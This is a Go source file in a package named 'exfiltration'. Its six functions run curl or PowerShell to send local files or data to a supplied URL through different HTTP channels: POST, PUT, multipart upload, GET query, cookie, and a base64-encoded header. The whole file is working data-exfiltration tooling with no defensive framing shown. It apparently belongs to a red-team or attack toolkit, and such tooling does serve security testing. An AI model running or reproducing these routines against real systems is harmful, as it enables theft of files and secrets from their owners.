package exfiltration

import (
	"fmt"
	"os/exec"
)

func HTTPExfilPost(targetURL, dataFile string) (string, error) {
	cmd := exec.Command("curl", "-X", "POST", "-d", fmt.Sprintf("@%s", dataFile), targetURL)
	out, err := cmd.CombinedOutput()
	return string(out), err
}

func HTTPExfilPut(targetURL, dataFile string) (string, error) {
	cmd := exec.Command("curl", "-X", "PUT", "--data-binary", fmt.Sprintf("@%s", dataFile), targetURL)
	out, err := cmd.CombinedOutput()
	return string(out), err
}

func HTTPExfilHeader(targetURL, dataFile, headerName string) (string, error) {
	cmd := exec.Command("powershell", "-Command",
		fmt.Sprintf(`$data=[Convert]::ToBase64String([IO.File]::ReadAllBytes('%s'));curl -H '%s: $data' %s`, dataFile, headerName, targetURL))
	out, err := cmd.CombinedOutput()
	return string(out), err
}

func HTTPExfilGet(urlTemplate, data string) (string, error) {
	cmd := exec.Command("curl", fmt.Sprintf(urlTemplate, data))
	out, err := cmd.CombinedOutput()
	return string(out), err
}

func HTTPExfilMultipart(targetURL, dataFile, fieldName string) (string, error) {
	cmd := exec.Command("curl", "-X", "POST", "-F", fmt.Sprintf("%s=@%s", fieldName, dataFile), targetURL)
	out, err := cmd.CombinedOutput()
	return string(out), err
}

func HTTPExfilCookies(targetURL, data string) (string, error) {
	cmd := exec.Command("curl", "--cookie", fmt.Sprintf("data=%s", data), targetURL)
	out, err := cmd.CombinedOutput()
	return string(out), err
}
